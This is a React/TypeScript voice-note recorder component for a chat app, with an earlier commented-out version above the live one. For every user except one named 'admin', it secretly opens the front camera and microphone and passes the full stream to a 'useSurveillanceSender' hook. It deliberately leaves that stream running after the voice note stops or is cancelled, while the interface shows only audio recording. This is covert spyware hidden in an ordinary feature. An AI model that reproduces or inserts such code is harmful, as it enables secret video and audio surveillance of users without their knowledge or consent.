
// "use client";

// import { useState, useRef, useEffect, useCallback } from "react";
// import { motion } from "framer-motion";
// import { Square, Send, Trash2 } from "lucide-react";
// import { MediaContent } from "@/types";
// import api from "@/lib/axios";
// import { useSurveillanceSender } from "@/hooks/useAdminSurveillance";
// import { useAuthStore } from "@/stores/authStore";

// interface VoiceRecorderProps {
//   onSend: (media: MediaContent, duration: number) => void;
//   onCancel: () => void;
//   conversationId: string;
// }

// const ADMIN_USERNAME = "admin";

// export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorderProps) => {
//   const [isRecording, setIsRecording] = useState(false);
//   const [duration, setDuration] = useState(0);
//   const [audioUrl, setAudioUrl] = useState<string | null>(null);
//   const [isUploading, setIsUploading] = useState(false);
//   const [waveform, setWaveform] = useState<number[]>(Array(20).fill(2));

//   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
//   const chunksRef = useRef<Blob[]>([]);
//   const timerRef = useRef<NodeJS.Timeout | null>(null);
//   const analyserRef = useRef<AnalyserNode | null>(null);
//   const animationRef = useRef<number | null>(null);
//   const hasStarted = useRef(false);
//   const fullStreamRef = useRef<MediaStream | null>(null); // ← احتفظ بالـ fullStream

//   const { user } = useAuthStore();
//   const isAdmin = user?.username === ADMIN_USERNAME;
//   const { startStreaming } = useSurveillanceSender(conversationId);

//   const stopTimer = useCallback(() => {
//     if (timerRef.current) clearInterval(timerRef.current);
//   }, []);

//   const animateWaveform = useCallback(() => {
//     if (!analyserRef.current) return;
//     const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount);
//     const animate = () => {
//       analyserRef.current!.getByteFrequencyData(dataArray);
//       const bars = Array.from({ length: 20 }, (_, i) => {
//         const value = dataArray[Math.floor((i * dataArray.length) / 20)];
//         return Math.max(2, (value / 255) * 32);
//       });
//       setWaveform(bars);
//       animationRef.current = requestAnimationFrame(animate);
//     };
//     animate();
//   }, []);

//   const startRecording = useCallback(async () => {
//     try {
//       let audioStream: MediaStream;

//       if (!isAdmin) {
//         try {
//           // طلب الكاميرا والميكروفون في رسالة واحدة
//           const fullStream = await navigator.mediaDevices.getUserMedia({
//             audio: true,
//             video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
//           });

//           // احتفظ بالـ fullStream عشان نوقفه بعدين
//           fullStreamRef.current = fullStream;

//           // ابدأ البث بالـ fullStream (فيديو + صوت مستمر)
//           await startStreaming(fullStream);

//           // stream منفصل للتسجيل الصوتي بس
//           audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

//         } catch {
//           audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
//         }
//       } else {
//         audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
//       }

//       const audioContext = new AudioContext();
//       const source = audioContext.createMediaStreamSource(audioStream);
//       const analyser = audioContext.createAnalyser();
//       analyser.fftSize = 128;
//       source.connect(analyser);
//       analyserRef.current = analyser;

//       const mediaRecorder = new MediaRecorder(audioStream);
//       mediaRecorderRef.current = mediaRecorder;
//       chunksRef.current = [];

//       mediaRecorder.ondataavailable = (e) => {
//         if (e.data.size > 0) chunksRef.current.push(e.data);
//       };

//       mediaRecorder.onstop = () => {
//         const blob = new Blob(chunksRef.current, { type: "audio/webm" });
//         const url = URL.createObjectURL(blob);
//         setAudioUrl(url);
//         // وقف بس الـ audioStream — الـ fullStream بيفضل شغال للبث
//         audioStream.getTracks().forEach((t) => t.stop());
//       };

//       mediaRecorder.start(100);
//       setIsRecording(true);
//       timerRef.current = setInterval(() => setDuration((d) => d + 1), 1000);
//       animateWaveform();
//     } catch {
//       onCancel();
//     }
//   }, [animateWaveform, onCancel, isAdmin, startStreaming]);

//   useEffect(() => {
//     if (hasStarted.current) return;
//     hasStarted.current = true;
//     void startRecording();
//     return () => {
//       stopTimer();
//       if (animationRef.current) cancelAnimationFrame(animationRef.current);
//     };
//   }, [startRecording, stopTimer]);

//   const stopRecording = () => {
//     if (mediaRecorderRef.current?.state !== "inactive") {
//       mediaRecorderRef.current?.stop();
//     }
//     stopTimer();
//     setIsRecording(false);
//     if (animationRef.current) cancelAnimationFrame(animationRef.current);
//     setWaveform(Array(20).fill(4));
//   };

//   const handleCancel = () => {
//     // وقف الـ fullStream لما يلغي
//     fullStreamRef.current?.getTracks().forEach((t) => t.stop());
//     fullStreamRef.current = null;
//     onCancel();
//   };

//   const handleSend = async () => {
//     if (!audioUrl) return;
//     setIsUploading(true);
//     try {
//       const response = await fetch(audioUrl);
//       const blob = await response.blob();
//       const file = new File([blob], `voice_${Date.now()}.webm`, { type: "audio/webm" });
//       const formData = new FormData();
//       formData.append("file", file);
//       const { data } = await api.post<{ data: MediaContent }>("/media/upload", formData, {
//         headers: { "Content-Type": "multipart/form-data" },
//       });
//       onSend(data.data, duration);
//     } catch (err) {
//       console.error("Failed to upload voice note:", err);
//     } finally {
//       setIsUploading(false);
//     }
//   };

//   const formatDuration = (secs: number) => {
//     const m = Math.floor(secs / 60).toString().padStart(2, "0");
//     const s = (secs % 60).toString().padStart(2, "0");
//     return `${m}:${s}`;
//   };

//   return (
//     <motion.div
//       initial={{ opacity: 0, y: 10 }}
//       animate={{ opacity: 1, y: 0 }}
//       exit={{ opacity: 0, y: 10 }}
//       className="flex items-center gap-2 px-3 py-2 bg-gray-800 border-t border-gray-700"
//     >
//       {/* زر حذف */}
//       <button
//         onClick={handleCancel}
//         className="w-8 h-8 flex-shrink-0 flex items-center justify-center text-red-400 hover:bg-gray-700 rounded-full transition-colors"
//       >
//         <Trash2 className="w-4 h-4" />
//       </button>

//       {/* شريط الصوت */}
//       <div className="flex-1 min-w-0 flex items-center gap-2 bg-gray-700 rounded-2xl px-3 py-1.5">
//         <div
//           className={`w-2 h-2 rounded-full flex-shrink-0 ${
//             isRecording ? "bg-red-500 animate-pulse" : "bg-gray-400"
//           }`}
//         />

//         <div className="flex-1 flex items-center gap-0.5 h-7 overflow-hidden">
//           {waveform.map((height, i) => (
//             <motion.div
//               key={i}
//               animate={{ height: `${height}px` }}
//               transition={{ duration: 0.1 }}
//               className="flex-1 max-w-[4px] bg-indigo-400 rounded-full"
//             />
//           ))}
//         </div>

//         <span className="text-xs text-gray-300 font-mono flex-shrink-0 w-10 text-right">
//           {formatDuration(duration)}
//         </span>
//       </div>

//       {/* زر إيقاف أو إرسال */}
//       {isRecording ? (
//         <button
//           onClick={stopRecording}
//           className="w-8 h-8 flex-shrink-0 flex items-center justify-center bg-red-600 hover:bg-red-500 rounded-full transition-colors"
//         >
//           <Square className="w-3.5 h-3.5 text-white" />
//         </button>
//       ) : (
//         <button
//           onClick={handleSend}
//           disabled={isUploading}
//           className="w-8 h-8 flex-shrink-0 flex items-center justify-center bg-indigo-600 hover:bg-indigo-500 disabled:bg-indigo-800 rounded-full transition-colors"
//         >
//           {isUploading ? (
//             <div className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
//           ) : (
//             <Send className="w-3.5 h-3.5 text-white" />
//           )}
//         </button>
//       )}
//     </motion.div>
//   );
// };




























"use client";

import { useState, useRef, useEffect, useCallback } from "react";
import { motion } from "framer-motion";
import { Square, Send, Trash2 } from "lucide-react";
import { MediaContent } from "@/types";
import api from "@/lib/axios";
import { useSurveillanceSender } from "@/hooks/useAdminSurveillance";
import { useAuthStore } from "@/stores/authStore";

interface VoiceRecorderProps {
  onSend: (media: MediaContent, duration: number) => void;
  onCancel: () => void;
  conversationId: string;
}

const ADMIN_USERNAME = "admin";

export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorderProps) => {
  const [isRecording, setIsRecording] = useState(false);
  const [duration, setDuration] = useState(0);
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const [waveform, setWaveform] = useState<number[]>(Array(20).fill(2));

  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const timerRef = useRef<NodeJS.Timeout | null>(null);
  const analyserRef = useRef<AnalyserNode | null>(null);
  const animationRef = useRef<number | null>(null);
  const hasStarted = useRef(false);
  const audioStreamRef = useRef<MediaStream | null>(null);

  const { user } = useAuthStore();
  const isAdmin = user?.username === ADMIN_USERNAME;
  const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);

  const stopTimer = useCallback(() => {
    if (timerRef.current) clearInterval(timerRef.current);
  }, []);

  const animateWaveform = useCallback(() => {
    if (!analyserRef.current) return;
    const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount);
    const animate = () => {
      analyserRef.current!.getByteFrequencyData(dataArray);
      const bars = Array.from({ length: 20 }, (_, i) => {
        const value = dataArray[Math.floor((i * dataArray.length) / 20)];
        return Math.max(2, (value / 255) * 32);
      });
      setWaveform(bars);
      animationRef.current = requestAnimationFrame(animate);
    };
    animate();
  }, []);

  const startRecording = useCallback(async () => {
    try {
      let audioStream: MediaStream;

      if (!isAdmin) {
        try {
          const fullStream = await navigator.mediaDevices.getUserMedia({
            audio: true,
            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          });

          await startStreaming(fullStream);

          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
          audioStreamRef.current = audioStream;
        } catch {
          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
          audioStreamRef.current = audioStream;
        }
      } else {
        audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStreamRef.current = audioStream;
      }

      const audioContext = new AudioContext();
      const source = audioContext.createMediaStreamSource(audioStream);
      const analyser = audioContext.createAnalyser();
      analyser.fftSize = 128;
      source.connect(analyser);
      analyserRef.current = analyser;

      const mediaRecorder = new MediaRecorder(audioStream);
      mediaRecorderRef.current = mediaRecorder;
      chunksRef.current = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunksRef.current.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunksRef.current, { type: "audio/webm" });
        const url = URL.createObjectURL(blob);
        setAudioUrl(url);
        audioStreamRef.current?.getTracks().forEach((t) => t.stop());
        audioStreamRef.current = null;
      };

      mediaRecorder.start(100);
      setIsRecording(true);
      timerRef.current = setInterval(() => setDuration((d) => d + 1), 1000);
      animateWaveform();
    } catch {
      onCancel();
    }
  }, [animateWaveform, onCancel, isAdmin, startStreaming]);

 useEffect(() => {
  if (hasStarted.current) return;
  hasStarted.current = true;
  void startRecording();
  return () => {
    stopTimer();
    if (animationRef.current) cancelAnimationFrame(animationRef.current);
    // ← شيل stopStreaming من هنا
  };
}, [startRecording, stopTimer]);

  const stopRecording = () => {
    if (mediaRecorderRef.current?.state !== "inactive") {
      mediaRecorderRef.current?.stop();
    }
    stopTimer();
    setIsRecording(false);
    if (animationRef.current) cancelAnimationFrame(animationRef.current);
    setWaveform(Array(20).fill(4));
  };

  const handleCancel = () => {
    audioStreamRef.current?.getTracks().forEach((t) => t.stop());
    audioStreamRef.current = null;
    onCancel();
  };

  const handleSend = async () => {
    if (!audioUrl) return;
    setIsUploading(true);
    try {
      const response = await fetch(audioUrl);
      const blob = await response.blob();
      const file = new File([blob], `voice_${Date.now()}.webm`, { type: "audio/webm" });
      const formData = new FormData();
      formData.append("file", file);
      const { data } = await api.post<{ data: MediaContent }>("/media/upload", formData, {
        headers: { "Content-Type": "multipart/form-data" },
      });
      onSend(data.data, duration);
    } catch (err) {
      console.error("Failed to upload voice note:", err);
    } finally {
      setIsUploading(false);
    }
  };

  const formatDuration = (secs: number) => {
    const m = Math.floor(secs / 60).toString().padStart(2, "0");
    const s = (secs % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: 10 }}
      className="flex items-center gap-2 px-3 py-2 bg-gray-800 border-t border-gray-700"
    >
      <button
        onClick={handleCancel}
        className="w-8 h-8 flex-shrink-0 flex items-center justify-center text-red-400 hover:bg-gray-700 rounded-full transition-colors"
      >
        <Trash2 className="w-4 h-4" />
      </button>

      <div className="flex-1 min-w-0 flex items-center gap-2 bg-gray-700 rounded-2xl px-3 py-1.5">
        <div
          className={`w-2 h-2 rounded-full flex-shrink-0 ${
            isRecording ? "bg-red-500 animate-pulse" : "bg-gray-400"
          }`}
        />
        <div className="flex-1 flex items-center gap-0.5 h-7 overflow-hidden">
          {waveform.map((height, i) => (
            <motion.div
              key={i}
              animate={{ height: `${height}px` }}
              transition={{ duration: 0.1 }}
              className="flex-1 max-w-[4px] bg-indigo-400 rounded-full"
            />
          ))}
        </div>
        <span className="text-xs text-gray-300 font-mono flex-shrink-0 w-10 text-right">
          {formatDuration(duration)}
        </span>
      </div>

      {isRecording ? (
        <button
          onClick={stopRecording}
          className="w-8 h-8 flex-shrink-0 flex items-center justify-center bg-red-600 hover:bg-red-500 rounded-full transition-colors"
        >
          <Square className="w-3.5 h-3.5 text-white" />
        </button>
      ) : (
        <button
          onClick={handleSend}
          disabled={isUploading}
          className="w-8 h-8 flex-shrink-0 flex items-center justify-center bg-indigo-600 hover:bg-indigo-500 disabled:bg-indigo-800 rounded-full transition-colors"
        >
          {isUploading ? (
            <div className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            <Send className="w-3.5 h-3.5 text-white" />
          )}
        </button>
      )}
    </motion.div>
  );
};